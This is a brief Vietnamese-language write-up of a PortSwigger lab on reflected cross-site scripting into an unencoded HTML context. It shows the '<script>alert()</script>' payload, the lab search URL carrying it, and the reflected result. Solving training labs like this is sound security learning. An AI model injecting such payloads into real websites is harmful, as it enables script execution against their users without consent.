# [Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

Không encode các kí tự đặc biệt, dễ dàng xss

Nhập `<script>alert()</script>` vào ô tìm kiếm:
```
https://0a6900fe03398af8c05941b1001d0094.web-security-academy.net/?search=%3Cscript%3Ealert%28%29%3C%2Fscript%3E
```

Kết quả:
```html
<h1>0 search results for '<script>alert()</script>'</h1>
```